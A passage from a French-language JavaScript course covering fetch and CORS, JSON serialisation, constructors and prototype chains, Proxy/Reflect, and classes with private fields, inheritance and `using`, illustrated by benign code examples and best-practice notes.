| `3xx` | Redirection : `301`, `302`, `304 Not Modified` |
| `4xx` | Erreur du client : `400 Bad Request`, `401 Unauthorized`, `403 Forbidden`, `404 Not Found`, `429 Too Many Requests` |
| `5xx` | Erreur du serveur : `500`, `502`, `503` |

### 17.2 `fetch`

**`fetch(url, options)`** envoie une requête et renvoie une **promesse** de `Response`. Il est disponible dans les navigateurs, Node.js, Deno et Bun.

```javascript
(async () => {
    const reponse = await fetch('https://jsonplaceholder.typicode.com/users');
    if (!reponse.ok) throw new Error(`Erreur HTTP ${reponse.status}`);   // ok vaut true pour 200-299
    const users = await reponse.json();
    console.log(users.length);                  // 10

    // fetch NE REJETTE PAS sur un 404 ou un 500 : il faut tester reponse.ok
    const absent = await fetch('https://jsonplaceholder.typicode.com/users/99999');
    console.log(absent.ok, absent.status);      // false 404
})();
```

> **Attention** : la promesse de `fetch` n'est rejetée que sur une **erreur réseau** (hors-ligne, DNS, CORS bloqué, annulation). Un statut HTTP d'erreur produit une réponse normale : **vérifiez toujours `response.ok`**.

#### Lire la réponse

| Méthode | Résultat |
| --- | --- |
| `.json()` | Objet JavaScript (analyse du JSON ; rejette si invalide) |
| `.text()` | Texte brut |
| `.blob()` | Données binaires typées (images, fichiers) |
| `.arrayBuffer()` | Octets bruts |
| `.formData()` | Données de formulaire |
| `.body` | Flux (`ReadableStream`) pour lire par morceaux |

Le corps ne peut être lu **qu'une seule fois** : utilisez `reponse.clone()` pour le lire deux fois. Propriétés utiles : `status`, `statusText`, `headers.get('content-type')`, `url`, `redirected`.

#### Envoyer des données : `POST`, `PUT`, `DELETE`

```javascript
const jeton = 'abc123';
const id = 1;

(async () => {
    const r = await fetch('https://jsonplaceholder.typicode.com/users', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',          // indique le format du corps
            Authorization: `Bearer ${jeton}`,
        },
        body: JSON.stringify({ nom: 'Alice', age: 30 }),   // le corps doit être une chaîne, un FormData, un Blob…
        signal: AbortSignal.timeout(8000),               // délai maximal
    });
    console.log(r.status, await r.json());             // 201 { nom: 'Alice', age: 30, id: 11 }

    const suppression = await fetch(`https://jsonplaceholder.typicode.com/users/${id}`, { method: 'DELETE' });
    console.log(suppression.status);                   // 200
})();
```

Pour envoyer un **formulaire** ou des **fichiers**, passez un objet `FormData` comme corps : le navigateur fixe lui-même le `Content-Type` (`multipart/form-data` avec sa frontière). Ne le définissez pas à la main.

#### Options principales de `fetch`

| Option | Rôle |
| --- | --- |
| `method` | Méthode HTTP (défaut `GET`) |
| `headers` | En-têtes (objet, tableau de paires ou `Headers`) |
| `body` | Corps de la requête |
| `signal` | Annulation / délai (`AbortSignal`) |
| `credentials` | `'omit'`, `'same-origin'` (défaut), `'include'` : envoi des cookies |
| `mode` | `'cors'` (défaut), `'same-origin'`, `'no-cors'` |
| `cache` | Politique de cache (`'no-store'`, `'reload'`, `'force-cache'`…) |
| `redirect` | `'follow'` (défaut), `'error'`, `'manual'` |

#### Construire des URL proprement

```javascript
const url = new URL('https://api.exemple.com/search');
url.searchParams.set('q', 'café & thé');       // encodage automatique des paramètres
url.searchParams.append('page', 2);
console.log(url.href);                         // https://api.exemple.com/search?q=caf%C3%A9+%26+th%C3%A9&page=2
console.log(URL.canParse('https://exemple.com'), URL.canParse('pas une url'));   // true false

const parametres = new URLSearchParams({ tri: 'nom', ordre: 'asc' });
console.log(parametres.toString());            // 'tri=nom&ordre=asc'
```

N'assemblez jamais une URL par concaténation avec des valeurs non encodées : utilisez `URL`, `URLSearchParams` ou `encodeURIComponent`.

#### Fonction utilitaire réutilisable

```javascript
async function requeteJSON(url, options = {}) {
    const r = await fetch(url, { headers: { Accept: 'application/json' }, ...options });
    if (!r.ok) throw new Error(`HTTP ${r.status} – ${await r.text()}`);
    return r.status === 204 ? null : r.json();
}

requeteJSON('https://jsonplaceholder.typicode.com/todos/1').then(console.log);
requeteJSON('https://jsonplaceholder.typicode.com/todos/99999').catch((e) => console.error(e.message));   // HTTP 404 – {}
```

#### Sécurité et CORS

La **politique de même origine** empêche une page de lire les réponses d'un autre site (origine = protocole + domaine + port). Le **CORS** (*Cross-Origin Resource Sharing*) est le mécanisme par lequel un **serveur** autorise explicitement certaines origines via l'en-tête `Access-Control-Allow-Origin`. Les requêtes « non simples » (méthodes `PUT`/`DELETE`, en-têtes personnalisés, `Content-Type: application/json`) sont précédées d'une requête de **pré-vérification** `OPTIONS` (*preflight*). Une erreur CORS ne se corrige **pas** côté client : c'est le serveur qu'il faut configurer (ou passer par un proxy de votre serveur).

- **Ne mettez jamais de clé secrète** dans du JavaScript client : tout visiteur peut la lire dans les outils de développement. Faites transiter les appels sensibles par votre serveur.
- Les cookies ne sont envoyés vers une autre origine qu'avec `credentials: 'include'` **et** une autorisation CORS explicite.
- Utilisez toujours **HTTPS**.
- Méfiez-vous des données reçues : une réponse d'API n'est pas fiable ; ne l'insérez jamais dans le DOM avec `innerHTML` sans assainissement.

### 17.3 JSON

**JSON** (*JavaScript Object Notation*) est un format texte léger d'échange de données, indépendant du langage. Il s'inspire de la syntaxe des littéraux JavaScript mais est **plus strict**.

```json
{
  "nom": "Alice",
  "age": 30,
  "actif": true,
  "langues": ["fr", "en"],
  "adresse": { "ville": "Paris" },
  "note": null
}
```

Règles : clés **entre guillemets doubles**, chaînes entre guillemets doubles (pas de guillemets simples), **pas de commentaires**, **pas de virgule finale**, valeurs limitées à : objet, tableau, chaîne, nombre, `true`, `false`, `null`. Pas de `undefined`, de fonctions, de dates natives, de `NaN` ni d'`Infinity`.

#### `JSON.stringify()` : objet → texte

```javascript
const objet = { nom: 'Alice', age: 30, mdp: 'secret' };

console.log(JSON.stringify({ a: 1, b: [1, 2] }));                 // '{"a":1,"b":[1,2]}'
console.log(JSON.stringify(objet, null, 2));                       // formaté (indentation de 2 espaces)
console.log(JSON.stringify(objet, ['nom', 'age']));               // liste blanche de clés
console.log(JSON.stringify(objet, (cle, val) => (cle === 'mdp' ? undefined : val)));   // fonction de remplacement (replacer)

class Point {
    constructor(x, y) { this.x = x; this.y = y; }
    toJSON() { return `${this.x},${this.y}`; }                    // personnalise la sérialisation
}
console.log(JSON.stringify({ p: new Point(1, 2) }));              // '{"p":"1,2"}'
```

#### `JSON.parse()` : texte → objet

```javascript
console.log(JSON.parse('{"a":1}'));                              // { a: 1 }
const avecDate = JSON.parse('{"date":"2026-10-11"}', (cle, val) => (cle === 'date' ? new Date(val) : val));   // reviver
console.log(avecDate.date instanceof Date);                      // true
```

#### Comportements à connaître

- `Date` → chaîne ISO (via `toJSON()`) ; `Map` et `Set` → `{}` (convertissez avec `[...map]` ou `Object.fromEntries`) ; `undefined`, fonctions et symboles sont **omis** (ou deviennent `null` dans un tableau) ; `NaN` et `Infinity` → `null` ; `BigInt` → `TypeError`.
- Les **références circulaires** provoquent une `TypeError` à la sérialisation.
- **`JSON.parse` avec accès au texte source** (ES2026) : le *reviver* reçoit un 3ᵉ paramètre `contexte` avec `source`, ce qui permet de lire de grands entiers sans perte de précision ; `JSON.rawJSON()` permet d'écrire de tels nombres.
- `JSON.parse` est plus sûr que `eval` : il n'exécute jamais de code. Mais le résultat doit toujours être **validé**.

#### Gérer les erreurs

```javascript
const entree = '{ invalide';

try {
    const data = JSON.parse(entree);
    console.log(data);
} catch (e) {
    console.error('JSON invalide :', e.message);     // SyntaxError
}
```

#### Importer un fichier JSON (ES2025)

```javascript
// config.json (même dossier) : { "port": 3000 }
import config from './config.json' with { type: 'json' };
console.log(config.port);   // 3000
```

### 17.4 Autres API web utiles

| API | Usage |
| --- | --- |
| `FormData` | Lire/construire des données de formulaire, envoyer des fichiers |
| `Headers`, `Request`, `Response` | Objets de `fetch` manipulables directement |
| `URL`, `URLSearchParams` | Analyse et construction d'URL |
| `WebSocket` | Communication bidirectionnelle temps réel |
| `EventSource` | Flux d'événements du serveur (SSE) |
| `navigator.sendBeacon` | Envoi fiable de petites données à la fermeture d'une page |
| `BroadcastChannel`, `postMessage` | Communication entre onglets, iframes, workers |
| `Web Workers` | Calcul en arrière-plan |
| `Intl` | Formatage localisé (module 6 et 23) |

### 17.5 Bonnes pratiques

- Testez `response.ok`, gérez les erreurs réseau, ajoutez un **délai maximal** et une **annulation**.
- **Validez** les données reçues (Zod, Valibot ou vérifications manuelles) ; ne faites jamais confiance à une API externe.
- Prévoyez les états *chargement*, *erreur* et *vide* dans l'interface.
- Limitez le débit (*debounce*) pour les recherches en direct ; mettez en cache les réponses stables.
- Respectez les limites de débit et gérez le code `429` (attendez, puis réessayez).
- Centralisez les appels dans un module `api.js` (URL de base, en-têtes, gestion d'erreur communes).

### Points clés du module 17

- `fetch` renvoie une promesse ; il ne rejette pas sur un statut d'erreur HTTP : testez `response.ok`.
- `JSON.stringify` / `JSON.parse` convertissent objets et texte ; ils ont des limites (dates, `Map`, `undefined`, circularité).
- CORS se règle côté serveur ; aucun secret dans le code client.
- Construisez les URL avec `URL` / `URLSearchParams`.

## 18. Constructeurs, prototypes et héritage

### 18.1 Créer des objets : panorama

```javascript
function Personne(nom, age) {
    this.nom = nom;
    this.age = age;
}

const litteral = { nom: 'Alice' };                    // littéral : le plus courant
const vide = Object.create(null);                     // sans prototype
const instance = new Personne('Alice', 30);           // constructeur

console.log(litteral, Object.getPrototypeOf(vide), instance);
// { nom: 'Alice' } null Personne { nom: 'Alice', age: 30 }
```

### 18.2 Fonctions constructeurs

Une **fonction constructeur** (nom en `PascalCase`) est une fonction destinée à être appelée avec **`new`** pour fabriquer des objets de même structure : des **instances**.

```javascript
function Personne(nom, age) {
    this.nom = nom;
    this.age = age;
}
const alice = new Personne('Alice', 30);
console.log(alice);                      // Personne { nom: 'Alice', age: 30 }
```

#### Ce que fait `new`

1. Crée un **nouvel objet vide**.
2. Lie son **prototype** à `Personne.prototype`.
3. Exécute le constructeur avec `this` pointant sur ce nouvel objet.
4. **Renvoie** l'objet (sauf si le constructeur renvoie explicitement un autre **objet**).

> **Attention** : sans `new`, `this` vaut `undefined` (mode strict) ou `globalThis` : le constructeur écrit alors des propriétés au mauvais endroit. Protégez-vous avec `if (!new.target) throw new TypeError('Utilisez new')`, ou utilisez une **classe**, qui refuse l'appel sans `new`.

### 18.3 Prototypes et chaîne de prototypes

Chaque objet possède un **prototype** (accessible par `Object.getPrototypeOf(obj)`), qui est lui-même un objet, ayant son propre prototype, et ainsi de suite jusqu'à `null` : c'est la **chaîne de prototypes**. Quand on lit une propriété absente de l'objet, le moteur la **cherche le long de la chaîne**. Les écritures, elles, se font **sur l'objet lui-même**.

Deux notions à ne pas confondre :

- `obj.__proto__` / `Object.getPrototypeOf(obj)` : le prototype **de** l'objet (`[[Prototype]]`).
- `Fonction.prototype` : l'objet qui deviendra le prototype des instances créées avec `new Fonction()`.

```javascript
function Personne(nom, age) {
    this.nom = nom;
    this.age = age;
}
const alice = new Personne('Alice', 30);

// Les méthodes partagées se placent sur le prototype : une seule copie en mémoire
Personne.prototype.saluer = function () {
    return `Bonjour, je suis ${this.nom}`;
};

console.log(alice.saluer());                                         // trouvée via le prototype
console.log(Object.getPrototypeOf(alice) === Personne.prototype);    // true
console.log(Object.hasOwn(alice, 'saluer'));                         // false : propriété héritée
console.log(Object.hasOwn(alice, 'nom'));                            // true  : propriété propre
console.log(Object.getPrototypeOf(Personne.prototype) === Object.prototype);   // true : la chaîne continue
console.log(Object.getPrototypeOf(Object.prototype));                // null : fin de chaîne
```

**Masquage** : une propriété propre de même nom **masque** celle du prototype. Modifier le prototype **après coup** affecte toutes les instances existantes, puisqu'elles le consultent dynamiquement.

> N'utilisez pas `__proto__` dans du nouveau code : préférez `Object.getPrototypeOf` et `Object.setPrototypeOf`. Changer le prototype d'un objet existant dégrade les optimisations du moteur ; fixez-le à la création.

#### Héritage avec les prototypes

```javascript
function Personne(nom, age) {
    this.nom = nom;
    this.age = age;
}
Personne.prototype.saluer = function () { return `Bonjour, je suis ${this.nom}`; };

function Etudiant(nom, age, filiere) {
    Personne.call(this, nom, age);                 // appel du « super constructeur » sur this
    this.filiere = filiere;
}
Etudiant.prototype = Object.create(Personne.prototype);   // chaîne : Etudiant.prototype → Personne.prototype
Etudiant.prototype.constructor = Etudiant;                // rétablir la référence au constructeur

const bob = new Etudiant('Bob', 20, 'Maths');
console.log(bob.saluer());                        // 'Bonjour, je suis Bob'
console.log(bob instanceof Personne);             // true
```

La syntaxe **`class ... extends`** (module 19) est du **sucre syntaxique** sur ce mécanisme : elle produit exactement ces chaînes de prototypes, en plus sûr et plus lisible.

### 18.4 `Object.create`

`Object.create(proto, descripteurs)` crée un objet avec un **prototype choisi**, sans fonction constructeur : c'est de la **délégation** directe.

```javascript
const animal = {
    parler() { return `${this.nom} fait un bruit`; },
};
const chien = Object.create(animal, { nom: { value: 'Rex', enumerable: true } });
console.log(chien.parler());                         // 'Rex fait un bruit'
console.log(Object.getPrototypeOf(chien) === animal);   // true

const dico = Object.create(null);                    // dictionnaire pur : aucune propriété héritée
dico.toString = 1;                                   // aucune collision
console.log('constructor' in dico);                  // false
```

|  | Constructeur / classe | `Object.create` |
| --- | --- | --- |
| Initialisation | Via le constructeur | Manuelle |
| Héritage | `extends` / `prototype` | Prototype choisi directement |
| Usage | Types d'objets avec état, instances nombreuses | Délégation simple, objets sans prototype |

### 18.5 Constructeurs intégrés

`Object`, `Array`, `Function`, `String`, `Number`, `Boolean`, `Symbol`, `BigInt`, `Date`, `RegExp`, `Map`, `Set`, `WeakMap`, `Promise`, `Error` et ses sous-types, `Proxy`, `ArrayBuffer`…

```javascript
console.log(new Date(0));                // 1970-01-01T00:00:00.000Z
console.log(new Map([['a', 1]]));        // Map(1) { 'a' => 1 }
console.log(new Set([1, 2]));            // Set(2) { 1, 2 }
console.log(new Error('msg').message);   // 'msg'
console.log(Object.getPrototypeOf([]) === Array.prototype);   // true
```

> **Attention** : évitez `new String('a')`, `new Number(1)`, `new Boolean(false)` : ils créent des **objets enveloppes** et non des primitives (`new Boolean(false)` est *truthy* !). Utilisez `String(x)`, `Number(x)`, `Boolean(x)` sans `new`.

Les primitives se comportent comme des objets grâce à des enveloppes **temporaires** : `'abc'.length` crée un `String` éphémère, lit la propriété, puis le jette.

### 18.6 Motifs de création

#### Fabrique (*factory function*)

```javascript
function creerPersonne(nom, age) {
    return {
        nom,
        age,
        saluer() { return `Bonjour, je suis ${nom}`; },
    };
}
console.log(creerPersonne('Alice', 30).saluer());   // 'Bonjour, je suis Alice'
```

**Avantages** : pas de `new` ni de `this`, confidentialité par fermeture. **Inconvénient** : une copie des méthodes par objet.

#### Encapsulation par fermeture

```javascript
function creerCompte(solde = 0) {
    return {
        deposer(m) { solde += m; },
        get solde() { return solde; },      // lecture seule : pas de setter
    };
}

const compte = creerCompte(100);
compte.deposer(50);
console.log(compte.solde);                  // 150

try {
    (() => { 'use strict'; compte.solde = 1000; })();    // sans setter : TypeError en mode strict, ignoré sinon
} catch (e) {
    console.error(e.name);                  // TypeError
}
console.log(compte.solde);                  // 150
```

#### Fabrique ou constructeur ?

|  | Fabrique | Constructeur / classe |
| --- | --- | --- |
| `new` requis | Non | Oui |
| `instanceof` | Non | Oui |
| Données privées | Fermetures | Champs `#privés` |
| Mémoire des méthodes | Copie par objet | Partagées via le prototype |
| `this` | Rarement nécessaire | Central |

### 18.7 Membres statiques

Les membres **statiques** appartiennent au **constructeur** lui-même, pas aux instances.

```javascript
function Personne(nom, age) {
    this.nom = nom;
    this.age = age;
}

Personne.espece = 'Homo sapiens';
Personne.comparerAge = (a, b) => a.age - b.age;

const groupe = [new Personne('Bob', 40), new Personne('Alice', 30)];
console.log(Personne.espece);                                    // 'Homo sapiens'
console.log(groupe.sort(Personne.comparerAge).map(p => p.nom));  // ['Alice', 'Bob']
console.log(groupe[0].espece);                                   // undefined : non hérité par les instances
```

Avec les classes : le mot-clé `static` (module 19).

### 18.8 Mixins et composition

L'**héritage** exprime « est un » ; la **composition** exprime « a la capacité de ». Assembler des comportements évite les hiérarchies profondes et rigides : « *favor composition over inheritance* ».

```javascript
const peutNager = { nager() { return `${this.nom} nage`; } };
const peutVoler = { voler() { return `${this.nom} vole`; } };

class Canard { constructor(nom) { this.nom = nom; } }
Object.assign(Canard.prototype, peutNager, peutVoler);   // mixin d'objets

const donald = new Canard('Donald');
console.log(donald.nager(), '/', donald.voler());        // 'Donald nage / Donald vole'

// Mixin sous forme de fonction : étend n'importe quelle classe de base
const Journalisable = (Base) => class extends Base {
    journal(msg) { console.log(`[${this.constructor.name}] ${msg}`); }
};
class Service extends Journalisable(Object) {}
new Service().journal('démarré');                        // '[Service] démarré'
```

### 18.9 Tester le type : `instanceof`, `constructor`, `isPrototypeOf`

```javascript
function Personne(nom) { this.nom = nom; }
const alice = new Personne('Alice');
const x = new Date();

console.log(alice instanceof Personne);                    // true : Personne.prototype est dans la chaîne
console.log(alice.constructor === Personne);               // true (fragile : propriété modifiable)
console.log(Personne.prototype.isPrototypeOf(alice));      // true
console.log(Array.isArray([1, 2]));                        // true : plus fiable que instanceof Array (iframes)
console.log(Object.prototype.toString.call(x));            // '[object Date]'
```

Limites : `instanceof` échoue entre **contextes différents** (iframes, fenêtres), et `constructor` est incorrect si l'on remplace le prototype sans le rétablir. On peut personnaliser `instanceof` :

```javascript
class Pair { static [Symbol.hasInstance](n) { return n % 2 === 0; } }
console.log(2 instanceof Pair, 3 instanceof Pair);   // true false
```

### 18.10 Usages avancés : `Proxy` et `Reflect`

Un **`Proxy`** enveloppe un objet et **intercepte** les opérations qu'on lui applique (lecture, écriture, `in`, `delete`, appel, `new`…) grâce à des fonctions appelées **pièges** (*traps*). **`Reflect`** expose les opérations par défaut sous forme de fonctions, pour les relayer proprement.

```javascript
const surveille = new Proxy({}, {
    get(cible, cle, recepteur) {
        console.log(`Lecture de ${String(cle)}`);
        return Reflect.get(cible, cle, recepteur);
    },
    set(cible, cle, valeur) {
        if (cle === 'age' && valeur < 0) throw new RangeError('Âge invalide');
        return Reflect.set(cible, cle, valeur);
    },
});

surveille.nom = 'Alice';
console.log(surveille.nom);        // 'Lecture de nom', puis 'Alice'

try {
    surveille.age = -5;
} catch (e) {
    console.error(e.name, e.message);   // RangeError Âge invalide
}
```

Usages : **validation**, **journalisation**, valeurs par défaut, **réactivité** (Vue 3), objets distants, mémoïsation transparente. Un proxy ajoute un coût de performance : ne l'utilisez pas dans les chemins critiques.

### 18.11 Déboguer constructeurs et prototypes

```javascript
function Personne(nom) { this.nom = nom; }
Personne.prototype.saluer = function () { return `Bonjour, je suis ${this.nom}`; };
const alice = new Personne('Alice');

console.dir(alice);                                            // inspection détaillée ([[Prototype]] dans les DevTools)
console.log(Object.getPrototypeOf(alice));                     // { saluer: [Function (anonymous)] }
console.log(Object.getOwnPropertyNames(Personne.prototype));   // ['constructor', 'saluer']
console.log(alice.constructor.name);                           // 'Personne'
```

Dans les **DevTools** (F12 → *Sources*), posez des points d'arrêt dans le constructeur et déroulez `[[Prototype]]` dans le panneau des variables.

Erreurs fréquentes : oubli de `new` ; `this` perdu dans un callback ; prototype remplacé sans rétablir `constructor` ; méthodes définies **dans** le constructeur (une copie par instance) ; modification de `Object.prototype` ou des prototypes natifs.

### Points clés du module 18

- `new` crée un objet, le relie à `Constructeur.prototype`, exécute le constructeur et renvoie l'objet.
- Les propriétés absentes sont cherchées le long de la **chaîne de prototypes** ; les méthodes partagées vivent sur le prototype.
- `Object.create` choisit directement le prototype ; `class` est du sucre syntaxique sur ce mécanisme.
- Préférez la **composition** à l'héritage profond ; `Proxy` intercepte les opérations pour validation ou réactivité.

## 19. Classes et programmation orientée objet

### 19.1 Les principes de la programmation orientée objet

La **programmation orientée objet** (POO) organise un programme autour d'**objets** qui regroupent des **données** (état) et les **comportements** (méthodes) qui s'y appliquent. Quatre principes la structurent :

| Principe | Idée | En JavaScript |
| --- | --- | --- |
| **Encapsulation** | Cacher l'état interne et n'exposer qu'une interface | Champs et méthodes `#privés`, accesseurs, fermetures |
| **Abstraction** | Exposer l'essentiel, masquer les détails | Classes à interface simple, classes « abstraites » simulées |
| **Héritage** | Une classe en spécialise une autre (relation « est un ») | `extends`, chaîne de prototypes |
| **Polymorphisme** | Des objets différents répondent au même message à leur manière | Redéfinition de méthodes, *duck typing* |

JavaScript est une POO **à prototypes** : les **classes** (ES2015) sont une syntaxe claire par-dessus ce mécanisme (module 18).

### 19.2 Définir une classe

```javascript
class Personne {
    // Champ public avec valeur par défaut (ES2022)
    espece = 'humain';
    // Champ privé : inaccessible hors de la classe
    #age;
    // Champ statique : appartient à la classe
    static compteur = 0;

    constructor(nom, age) {            // appelé par new ; une seule méthode constructor par classe
        this.nom = nom;
        this.#age = age;
        Personne.compteur++;
    }

    // Méthode d'instance : placée sur le prototype, partagée
    saluer() {
        return `Bonjour, je suis ${this.nom}`;
    }

    // Accesseurs (getter / setter) : s'utilisent comme des propriétés
    get age() { return this.#age; }
    set age(valeur) {
        if (valeur < 0) throw new RangeError('Âge invalide');
        this.#age = valeur;
    }

    // Méthode privée
    #secret() { return 'caché'; }
    reveler() { return this.#secret(); }

    // Méthode statique : s'appelle sur la classe
    static creerAnonyme() { return new Personne('Anonyme', 0); }

    // Bloc d'initialisation statique (ES2022)
    static { Personne.registre = new Map(); }

    toString() { return `${this.nom} (${this.#age} ans)`; }
}

const alice = new Personne('Alice', 30);
console.log(alice.saluer());                    // 'Bonjour, je suis Alice'
alice.age = 31;                                 // appelle le setter
console.log(alice.age);                         // 31
console.log(String(alice));                     // 'Alice (31 ans)'
console.log(alice.reveler());                   // 'caché'
console.log(Personne.creerAnonyme().nom);       // 'Anonyme'
console.log(Personne.compteur);                 // 2
console.log(Personne.registre instanceof Map);  // true

try {
    alice.age = -1;                             // le setter refuse la valeur
} catch (e) {
    console.error(e.name, e.message);           // RangeError Âge invalide
}

try {
    new Function('p', 'return p.#age;');        // champ privé utilisé hors de la classe : erreur de syntaxe
} catch (e) {
    console.error(e.name);                      // SyntaxError
}
```

> **À retenir** : les classes sont **toujours en mode strict**, **ne sont pas initialisées avant leur déclaration** (TDZ, contrairement aux déclarations de fonction), et **ne peuvent pas être appelées sans `new`** (`TypeError`). Les méthodes de classe ne sont **pas énumérables**, et typeof d'une classe vaut `'function'`.

#### Les membres d'une classe

| Membre | Syntaxe | Appartient à |
| --- | --- | --- |
| Constructeur | `constructor(...) { }` | La classe (initialise l'instance) |
| Méthode | `nom() { }` | Le **prototype** (partagée) |
| Champ public | `nom = valeur;` | Chaque **instance** |
| Champ / méthode privé(e) | `#nom` | Chaque instance / la classe |
| Accesseur | `get x() {}` / `set x(v) {}` | Le prototype |
| Statique | `static x`, `static m() {}` | La **classe** |
| Bloc statique | `static { }` | Exécuté une fois à la définition |
| Méthode générateur | `*[Symbol.iterator]() {}` | Le prototype |
| Méthode asynchrone | `async m() {}` | Le prototype |

**Piège des méthodes passées en callback** : une méthode extraite perd son `this`. Solutions : fonction fléchée, `bind`, ou **champ fléché** (une copie par instance) :

```javascript
class Bouton {
    etiquette = 'OK';
    cliquer = () => console.log(`Clic sur ${this.etiquette}`);   // this lié à l'instance, utilisable en callback
}
const b = new Bouton();
const { cliquer } = b;
cliquer();                                                        // 'Clic sur OK'
```

#### Expression de classe

```javascript
const Animal = class {
    parler() { return '...'; }
};
console.log(new Animal().parler());   // '...'
console.log(Animal.name);             // 'Animal'
```

### 19.3 Héritage : `extends` et `super`

`class Fille extends Mere` relie `Fille.prototype` à `Mere.prototype` **et** `Fille` à `Mere` (pour hériter des membres statiques). **`super(...)`** appelle le constructeur parent ; **`super.methode()`** appelle la version parente d'une méthode.

```javascript
class Personne {
    constructor(nom, age) {
        this.nom = nom;
        this.age = age;
    }
    saluer() { return `Bonjour, je suis ${this.nom}`; }
}

class Etudiant extends Personne {
    constructor(nom, age, filiere) {
        super(nom, age);            // OBLIGATOIRE avant tout usage de this dans un constructeur dérivé
        this.filiere = filiere;
    }

    saluer() {                       // redéfinition (override)
        return `${super.saluer()} et j'étudie ${this.filiere}`;
    }
}

const bob = new Etudiant('Bob', 20, 'Maths');
console.log(bob.saluer());              // 'Bonjour, je suis Bob et j'étudie Maths'
console.log(bob instanceof Personne);   // true
console.log(Object.getPrototypeOf(Etudiant) === Personne);   // true : les statiques sont hérités
```

Règles : si une classe dérivée **n'a pas** de constructeur, un constructeur par défaut qui transmet tous les arguments à `super` est fourni ; sans appel à `super()` avant `this`, une `ReferenceError` est levée. On peut étendre des classes natives (`Array`, `Error`, `Map`, `HTMLElement`…) :

```javascript
class Pile extends Array {
    sommet() { return this.at(-1); }
}
const p = new Pile();
p.push(1, 2, 3);
console.log(p.sommet(), p.length, p instanceof Array);   // 3 3 true
```

### 19.4 Membres statiques et héritage

```javascript
class Maths {
    static PI = 3.14159;
    static carre(x) { return x * x; }
    static #privee() { return 'statique privée'; }    // ES2022
    static test() { return Maths.#privee(); }
}
class MathsPlus extends Maths {}                      // hérite des statiques
console.log(Maths.carre(4), Maths.PI, Maths.test());  // 16 3.14159 'statique privée'
console.log(MathsPlus.carre(3));                      // 9
```

Usages : utilitaires, **fabriques** nommées (`Personne.depuisJSON(...)`), compteurs, constantes, registres.

### 19.5 Encapsulation

| Mécanisme | Description |
| --- | --- |
| **Champs et méthodes `#privés`** (recommandé) | Vraiment inaccessibles de l'extérieur, y compris pour les sous-classes : garanti par le langage |
| Convention `_nom` | Simple indication « usage interne », **aucune protection** |
| Fermetures | Variables privées dans une fonction fabrique |
| `Symbol` / `WeakMap` | Techniques anciennes de confidentialité partielle |

```javascript
class Compte {
    #solde = 0;
    deposer(m) {
        if (m <= 0) throw new Error('Montant invalide');
        this.#solde += m;
        return this;                              // permet le chaînage d'appels
    }
    get solde() { return this.#solde; }
    static estCompte(o) { return #solde in o; }   // test de marque privée (ES2022)
}

const compte = new Compte().deposer(50).deposer(25);
console.log(compte.solde);                  // 75
console.log(Compte.estCompte(compte), Compte.estCompte({}));   // true false

try {
    compte.deposer(-5);
} catch (e) {
    console.error(e.message);               // 'Montant invalide'
}
```

Les champs privés ne sont visibles ni par `Object.keys`, ni par `JSON.stringify`, ni par les `Proxy` (qui les relaient mal) : ils ne se « fuient » pas par accident. Définissez `toJSON()` si vous voulez les sérialiser.

### 19.6 Abstraction

L'**abstraction** consiste à exposer une **interface simple** et à masquer les détails d'implémentation. JavaScript n'a pas de classes abstraites natives : on les **simule** avec `new.target` et en levant une erreur dans les méthodes à redéfinir.

```javascript
class Forme {
    constructor() {
        if (new.target === Forme) throw new TypeError('Forme est abstraite');
    }
    aire() { throw new Error('À implémenter dans la sous-classe'); }
    decrire() { return `Aire : ${this.aire().toFixed(2)}`; }    // méthode « gabarit » qui s'appuie sur aire()
}

class Cercle extends Forme {
    constructor(r) { super(); this.r = r; }
    aire() { return Math.PI * this.r ** 2; }
}

console.log(new Cercle(1).decrire());   // 'Aire : 3.14'

try {
    new Forme();                        // une classe abstraite ne s'instancie pas
} catch (e) {
    console.error(e.name, e.message);   // TypeError Forme est abstraite
}
```

### 19.7 Polymorphisme et *duck typing*

Le **polymorphisme** permet d'appeler la même méthode sur des objets de types différents, chacun réagissant à sa manière. En JavaScript, le **typage canard** (*duck typing*) prime : ce qui compte est **ce que l'objet sait faire** (« s'il cancane comme un canard… »), non sa classe déclarée.

```javascript
class Cercle { constructor(r) { this.r = r; } aire() { return Math.PI * this.r ** 2; } }
class Rectangle { constructor(l, h) { this.l = l; this.h = h; } aire() { return this.l * this.h; } }
const objetLibre = { aire: () => 42 };   // aucun lien d'héritage, mais même interface

const formes = [new Cercle(1), new Rectangle(2, 3), objetLibre];
console.log(formes.map(f => f.aire()));   // [3.14..., 6, 42] : chaque objet répond à sa manière
```

### 19.8 Méthodes et symboles spéciaux

| Symbole / méthode | Rôle |
| --- | --- |
| `toString()` | Conversion en texte (gabarits, concaténation) |
| `[Symbol.toPrimitive](indice)` | Conversion en valeur primitive (`'number'`, `'string'`, `'default'`) |
| `valueOf()` | Valeur utilisée dans les opérations arithmétiques et comparaisons |
| `toJSON()` | Personnalise `JSON.stringify` |
| `[Symbol.iterator]` / `[Symbol.asyncIterator]` | Rend l'objet itérable (module 13) |
| `[Symbol.hasInstance]` | Personnalise `instanceof` |
| `[Symbol.toStringTag]` | Étiquette de `Object.prototype.toString` |
| `[Symbol.species]` | Constructeur utilisé par les méthodes dérivées (`map` sur une sous-classe d'`Array`) |

```javascript
class Temperature {
    constructor(c) { this.c = c; }
    [Symbol.toPrimitive](indice) {
        return indice === 'string' ? `${this.c} °C` : this.c;
    }
}
const t = new Temperature(21);
console.log(`${t}`, t + 1, t > 20);   // '21 °C' 22 true
```

### 19.9 Gestion explicite des ressources : `using`

Le mot-clé **`using`** (*Explicit Resource Management*) libère automatiquement une ressource (fichier, connexion, verrou) à la **sortie du bloc**, même en cas d'erreur, en appelant `[Symbol.dispose]()`. `await using` fait de même avec `[Symbol.asyncDispose]()`. Il a atteint le **stade 4** de TC39 en 2026 (publication prévue dans ES2027) : vérifiez la prise en charge de vos environnements ; un transpileur peut le fournir.

```javascript
function ouvrirFichier(nom) {
    console.log('ouverture de', nom);
    return { nom, [Symbol.dispose]() { console.log('fermeture de', nom); } };
}

{
    using fichier = ouvrirFichier('a.txt');     // fichier[Symbol.dispose]() est appelé à la sortie du bloc
    console.log('travail avec', fichier.nom);
}
// ouverture de a.txt, travail avec a.txt, puis fermeture de a.txt (même si une exception survient)
```

Plusieurs déclarations `using` sont libérées dans l'**ordre inverse** de leur création. `DisposableStack` permet de regrouper des ressources dynamiquement.

### 19.10 Classes, fonctions ou objets ? Quand utiliser quoi

| Situation | Choix conseillé |
| --- | --- |
| Entité avec **état** et comportements liés, nombreuses instances | **Classe** |
| Simple transformation de données | **Fonctions pures** |
